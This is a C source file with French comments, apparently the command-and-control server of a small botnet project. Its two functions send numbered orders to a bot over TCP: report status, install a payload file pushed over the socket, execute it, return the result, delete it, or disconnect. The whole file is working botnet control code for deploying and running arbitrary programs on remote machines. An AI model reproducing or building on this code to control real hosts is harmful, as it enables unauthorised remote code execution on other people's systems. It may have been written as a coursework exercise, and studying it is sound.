#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <sys/sendfile.h>
#include <libnetwork.h>
#include "cc.h"

/**
 * void send_file_tcp(void *s, char *filename)
 * Fonction qui envoie la charge de travail dans la socket TCP puis la ferme à la fin 
 *
 * param pointeur vers la socket TCP
 * param le nom de fichier à envoyer
 * 
 */
void send_file_tcp(void *s, char *filename)
{

    int socket_tcp = *((int *)s);
    int sent_bytes = 0;
    char file_size[256];
    struct stat file_stat;
    int fd;
    off_t offset;
    int remain_data;

    //Read file
    fd = open(filename, O_RDONLY);
    if (fd == -1)
    {
        perror("Error IN Opening File .. \n");
        return;
    }
    //Récupère la taille du fichier à envoyer
    if (fstat(fd, &file_stat) < 0)
    {
        perror("Error in getting file size \n");
    }

    //Sending file name de la charge utile
    if (send(socket_tcp, filename, TAILLE_FILENAME, 0) < 0)
    {
        perror("Error on sending file size \n");
    }

    sprintf(file_size, "%ld", file_stat.st_size);
    /* Sending file size */
    if (send(socket_tcp, file_size, sizeof(file_size), 0) < 0)
    {
        perror("Error on sending file size");
    }
    printf("Sent file Size: %s bytes\n", file_size);

    offset = 0;
    remain_data = file_stat.st_size;
    /* Sending file data */
    /* Envoie le fichier en plusieurs fois : https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
    while (((sent_bytes = sendfile(socket_tcp, fd, &offset, BUFSIZ)) > 0) && (remain_data > 0))
    {
        DEBUG_PRINT(("Sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data));
        remain_data -= sent_bytes;
        DEBUG_PRINT(("2. Sent sent %d bytes from file's data, offset is now : %ld and remaining data = %d\n", sent_bytes, offset, remain_data));
    }
    close(fd); // close the filE
    close(socket_tcp);
}

/**
 * void send_command_tcp(void *s, char num)
 * Fonction qui récupère une socket_tcp et un numéro de commande sous forme de char(pour optimiser)
 * selon le numéro de commande elle envoie un ordre sous forme de chaine de caractère au bot
 * selon l'ordre qu'il recevra il agira en conséquence sur la charge utile
 * apres lui avoir envoyée la commande à faire elle appelle la fct qui envoie la charge utile
 * 
 * param pointeur vers la socket TCP
 */

void send_command_tcp(ordre_t *ordre)
{
    int socket_tcp = init_socket_bot(ordre->bot);
    char num = ordre->cmd;
    char *filename = ordre->filename;
    char msg_recu[TAILLE_MSG_PROTOCOLE];
    //bot_t bot;
    char msg;
    switch (num)
    {
    case '1': //Demande d'envoyer le statut du bot
        printf("Demande d'avoir le 'status' d'un bot\n");
        write(socket_tcp, &num, sizeof(char));
        if (receiveTCP(socket_tcp, &msg, sizeof(char)) < 0)
        {
            printf("Erreur dans la réception du msg_recu \n");
        }
        printf("L'info du bot est de %c\n", msg);
        break;
    case '2': //Demande d'installation puis l'envoie du fichier à envoyer
        printf("Demande d'installation' d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        write(socket_tcp, filename, TAILLE_FILENAME);
        send_file_tcp((void *)&socket_tcp, filename);
        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
        {
            fprintf(stderr, "Erreur dans la réception du renvoie du install_charge \n");
        }
        printf("Le bot m'a répondu le code : %s\n", msg_recu);
        break;

    case '3': //Demande d'exécuter le fichier
        printf("Demande d'exec d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        write(socket_tcp, filename, TAILLE_FILENAME);
        break;
    case '4': //Demande de donner le résultat de l'exec
        printf("Demande d'avoir le resultat d'exec d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        write(socket_tcp, filename, TAILLE_FILENAME);
        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
        {
            fprintf(stderr, "Erreur dans la réception du msg_recu \n");
        }
        printf(" Le bot m'a répondu que le résultat de son exéc est : %s\n", msg_recu);
        break;
    case '5': // Demande de supprimer
        printf("Demande de suppression d'un fichier\n");
        write(socket_tcp, &num, sizeof(char));
        write(socket_tcp, filename, TAILLE_FILENAME);
        if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
        {
            fprintf(stderr, "Erreur dans la réception du renvoie du rm_charge \n");
        }
        printf("Le bot m'a répondu le code : %s\n", msg_recu);
        break;
    case '6': //Demande de quitter la connexion
        printf("Demande de quitter la connexion\n");
        write(socket_tcp, &num, sizeof(char));
        break;
    default:
        fprintf(stderr, "[send_command_tcp]: Erreur dans le code commande recu\n");
        break;
    }
    free(ordre->filename);
    close(socket_tcp);
}
